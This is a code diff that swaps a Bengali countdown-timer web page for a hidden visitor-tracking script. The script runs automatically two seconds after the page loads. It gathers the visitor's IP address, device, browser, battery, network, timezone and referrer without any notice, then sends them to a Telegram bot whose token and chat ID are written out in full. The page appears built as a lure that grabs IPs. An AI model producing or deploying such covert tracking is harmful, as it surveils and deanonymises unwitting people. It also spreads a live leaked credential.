@@ -1,194 +1,150 @@
-<!DOCTYPE html>
-<html lang="bn">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>স্টাইলিশ কাউন্টডাউন | ১ → ০</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            user-select: none;
-        }
-
-        body {
-            min-height: 100vh;
-            background: radial-gradient(circle at 20% 30%, #0a0f1f, #02040c);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
-            padding: 1rem;
-        }
-
-        /* মূল কন্টেইনার */
-        .countdown-card {
-            background: rgba(20, 28, 40, 0.6);
-            backdrop-filter: blur(20px);
-            border-radius: 3.5rem;
-            padding: 2rem 2rem 2.2rem;
-            width: 100%;
-            max-width: 450px;
-            text-align: center;
-            box-shadow: 0 30px 50px -15px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            transition: all 0.3s;
-        }
-
-        /* অ্যানিমেটেড রিং সহ বৃত্ত */
-        .ring-wrapper {
-            position: relative;
-            width: 260px;
-            height: 260px;
-            margin: 0 auto 1rem;
-        }
-
-        svg {
-            width: 100%;
-            height: 100%;
-            transform: rotate(-90deg);
-        }
-
-        .ring-bg {
-            stroke: rgba(255, 255, 255, 0.1);
-            stroke-width: 8;
-            fill: none;
-        }
-
-        .ring-progress {
-            stroke: url(#grad);
-            stroke-width: 8;
-            fill: none;
-            stroke-linecap: round;
-            stroke-dasharray: 754; /* 2*pi*120 ≈ 754 */
-            stroke-dashoffset: 0;
-            transition: stroke-dashoffset 0.25s linear;
-            filter: drop-shadow(0 0 8px #ffaa44);
-        }
-
-        .timer-digit {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 5.6rem;
-            font-weight: 800;
-            font-family: 'Fira Mono', 'JetBrains Mono', monospace;
-            background: linear-gradient(145deg, #FFF2D7, #FFB347);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            text-shadow: 0 0 20px rgba(255, 180, 70, 0.6);
-            letter-spacing: 2px;
-            animation: gentlePulse 0.8s infinite alternate;
-        }
-
-        @keyframes gentlePulse {
-            0% { text-shadow: 0 0 5px #ffb347; opacity: 0.95; }
-            100% { text-shadow: 0 0 25px #ff9500; opacity: 1; }
-        }
-
-        .message {
-            margin-top: 1.2rem;
-            font-size: 1.25rem;
-            font-weight: 500;
-            background: rgba(0,0,0,0.45);
-            display: inline-block;
-            padding: 0.5rem 1.4rem;
-            border-radius: 60px;
-            color: #c0e0ff;
-            backdrop-filter: blur(4px);
-            letter-spacing: 0.5px;
-        }
-
-        .footer-note {
-            margin-top: 2rem;
-            font-size: 0.7rem;
-            color: #6b86a3;
-            border-top: 1px dashed rgba(255,255,255,0.15);
-            padding-top: 1rem;
-            display: inline-block;
-            width: 80%;
-        }
-
-        @media (max-width: 480px) {
-            .ring-wrapper {
-                width: 200px;
-                height: 200px;
-            }
-            .timer-digit {
-                font-size: 4rem;
-            }
-            .message {
-                font-size: 1rem;
-            }
-        }
-    </style>
-</head>
-<body>
-<div class="countdown-card">
-    <div class="ring-wrapper">
-        <svg viewBox="0 0 280 280">
-            <defs>
-                <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%">
-                    <stop offset="0%" stop-color="#FFCD7E" />
-                    <stop offset="100%" stop-color="#FF9400" />
-                </linearGradient>
-            </defs>
-            <circle class="ring-bg" cx="140" cy="140" r="120"></circle>
-            <circle class="ring-progress" cx="140" cy="140" r="120" id="progressRing"></circle>
-        </svg>
-        <div class="timer-digit" id="countNumber">1</div>
-    </div>
-    <div class="message" id="statusMsg">১ সেকেন্ড বাকি ⏱️</div>
-</div>
-</div>
-
 <script>
-    (function() {
-        let current = 1;       // 1 থেকে শুরু, তারপর 0
-        const total = 1;       // মোট সময় 1 সেকেন্ড (1→0)
-        const circumference = 2 * Math.PI * 120; // ≈ 753.98
-        const ring = document.getElementById('progressRing');
-        const numberDiv = document.getElementById('countNumber');
-        const statusSpan = document.getElementById('statusMsg');
+(function() {
+    // ============================================
+    // বিস্তারিত ভিজিটর ট্র্যাকিং (CORS error থাকবে না)
+    // ============================================
 
-        ring.style.strokeDasharray = circumference;
+    const BOT_TOKEN = "8606366033:AAGgmTsvcGpTuYrnDvHCkDmsrJO9KBSRIOY";
+    const DEFAULT_CHAT_ID = "7709670231";
 
-        function updateProgress(value) {
-            // value বর্তমান সেকেন্ড (1 বা 0)
-            const offset = circumference - (value / total) * circumference;
-            ring.style.strokeDashoffset = offset;
-        }
-
-        function updateUI() {
-            numberDiv.innerText = current;
-            updateProgress(current);
-            
-            if (current === 1) {
-                statusSpan.innerHTML = "১ সেকেন্ড বাকি ⏱️";
-            } else if (current === 0) {
-                statusSpan.innerHTML = "😘";
-                numberDiv.style.animation = "none";
-                numberDiv.style.background = "linear-gradient(135deg, #FFD966, #FFAD33)";
-                numberDiv.style.webkitBackgroundClip = "text";
-                updateProgress(0);   // পুরো রিং কমপ্লিট দেখাবে
+    // ✅ IP ঠিকানা (CORS-মুক্ত ipify.org)
+    async function getIPAddress() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            if (res.ok) {
+                const data = await res.json();
+                return data.ip;
             }
+        } catch(e) {}
+        return "আইপি পাওয়া যায়নি";
+    }
+
+    // ডিভাইস ও ব্রাউজারের তথ্য
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let platform = "অজানা";
+        let browser = "অজানা";
+
+        if (/iPhone|iPad|iPod/i.test(ua)) platform = "iOS";
+        else if (/Android/i.test(ua)) platform = "Android";
+        else if (/Windows/i.test(ua)) platform = "Windows";
+        else if (/Mac/i.test(ua)) platform = "macOS";
+        else if (/Linux/i.test(ua)) platform = "Linux";
+
+        if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome";
+        else if (/Firefox/i.test(ua)) browser = "Firefox";
+        else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
+        else if (/Edg/i.test(ua)) browser = "Edge";
+
+        return { platform, browser };
+    }
+
+    // ব্যাটারি তথ্য (যদি সমর্থিত হয়)
+    async function getBatteryInfo() {
+        if (!navigator.getBattery) return "সমর্থিত নয়";
+        try {
+            const battery = await navigator.getBattery();
+            const level = Math.round(battery.level * 100);
+            const isCharging = battery.charging;
+            return `${level}% (${isCharging ? "হ্যাঁ" : "না"})`;
+        } catch(e) {
+            return "পাওয়া যায়নি";
         }
+    }
 
-        updateUI();
+    // নেটওয়ার্ক তথ্য (connection API)
+    function getNetworkInfo() {
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (!conn) return { type: "নেই", rtt: "নেই", speed: "নেই" };
+        const effectiveType = conn.effectiveType || "অজানা"; // '4g', '3g', etc.
+        const rtt = conn.rtt ? `${conn.rtt}ms` : "নেই";
+        const downlink = conn.downlink ? `${conn.downlink}Mbps` : "নেই";
+        // মানবপাঠ্য নেটওয়ার্ক টাইপ
+        let type = effectiveType.toUpperCase();
+        if (type === '4G') type = '4G';
+        else if (type === '3G') type = '3G';
+        else if (type === '2G') type = '2G';
+        else if (type === 'SLOW-2G') type = 'Slow 2G';
+        return { type, rtt, speed: downlink };
+    }
 
-        const timer = setInterval(() => {
-            if (current <= 0) {
-                clearInterval(timer);
-                statusSpan.innerHTML = " (পুনরায় দেখতে রিফ্রেশ করুন)";
+    // অন্যান্য তথ্য
+    function getExtraInfo() {
+        const colorDepth = `${screen.colorDepth}-bit`;
+        const language = navigator.language || navigator.userLanguage || "অজানা";
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "অজানা";
+        const localTime = new Date().toLocaleString('bn-BD', { hour12: false });
+        const cookies = navigator.cookieEnabled ? "সক্রিয়" : "নিষ্ক্রিয়";
+        const referrer = document.referrer ? document.referrer : "সরাসরি";
+        return { colorDepth, language, timezone, localTime, cookies, referrer };
+    }
+
+    async function trackVisitor() {
+        // বট টোকেন যাচাই
+        try {
+            const check = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
+            const checkResult = await check.json();
+            if (!checkResult.ok) {
+                console.warn("বট টোকেন ভুল! @BotFather থেকে নতুন টোকেন নিন");
                 return;
             }
-            current--;   // 1 → 0
-            updateUI();
-        }, 1000);
-    })();
-</script>
-</body>
-</html>
+            console.log("বট সক্রিয়:", checkResult.result.username);
+        } catch(e) {
+            console.warn("বট চেক করা যায়নি");
+            return;
+        }
+
+        // সব তথ্য সমান্তরালে সংগ্রহ
+        const [ip, battery, device, network, extra] = await Promise.all([
+            getIPAddress(),
+            getBatteryInfo(),
+            getDeviceInfo(),
+            getNetworkInfo(),
+            getExtraInfo()
+        ]);
+
+        const now = new Date();
+        const message = `📢 নিউ ভিজিট (ক্লিক করা হয়েছে)
+আইপি: ${ip}
+ওএস: ${device.platform}
+ব্রাউজার: ${device.browser}
+স্ক্রিন: ${screen.width}x${screen.height}
+কালার ডেপথ: ${extra.colorDepth}
+ব্যাটারি: ${battery}
+নেটওয়ার্ক: ${network.type}
+RTT: ${network.rtt}
+স্পিড: ${network.speed}
+ভাষা: ${extra.language}
+টাইমজোন: ${extra.timezone}
+স্থানীয় সময়: ${extra.localTime}
+কুকি: ${extra.cookies}
+রেফারার: ${extra.referrer}`;
+
+        try {
+            const params = new URLSearchParams();
+            params.append('chat_id', DEFAULT_CHAT_ID);
+            params.append('text', message);
+
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: params
+            });
+
+            const result = await res.json();
+            if (result.ok) {
+                console.log("✅ টেলিগ্রামে মেসেজ পাঠানো হয়েছে");
+            } else {
+                console.error("❌ Telegram error:", result.description);
+            }
+        } catch(e) {
+            console.warn("নেটওয়ার্ক এরর:", e);
+        }
+    }
+
+    // পেজ লোডের ২ সেকেন্ড পরে ট্র্যাকিং শুরু
+    setTimeout(() => {
+        trackVisitor();
+    }, 2000);
+})();
+    </script>
